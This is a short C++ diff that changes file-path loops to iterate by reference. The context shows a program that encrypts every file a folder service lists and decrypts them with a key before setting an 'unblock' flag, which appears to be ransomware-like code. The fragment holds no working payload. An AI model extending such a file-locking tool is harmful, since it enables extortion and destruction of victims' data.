@@ -46,7 +46,7 @@ int main(int argc, char *argv[])
 
         std::vector<std::string> files = folderservice.list_files_for_decryption();
 
-        for (std::string filePath : files) {
+        for (std::string& filePath : files) {
             encryptor->decryptFile(filePath, key);
         }
 
@@ -55,7 +55,7 @@ int main(int argc, char *argv[])
 
     std::vector<std::string> files = folderservice.list_files_for_encryption();
 
-    for (std::string filePath : files) {
+    for (std::string& filePath : files) {
         encryptor->encryptFile(filePath);
     }
 
@@ -78,7 +78,7 @@ int main(int argc, char *argv[])
 
                 std::vector<std::string> files = folderservice.list_files_for_decryption();
 
-                for (std::string filePath : files) {
+                for (std::string& filePath : files) {
                     encryptor->decryptFile(filePath, key);
                 }
                 unblock = true;
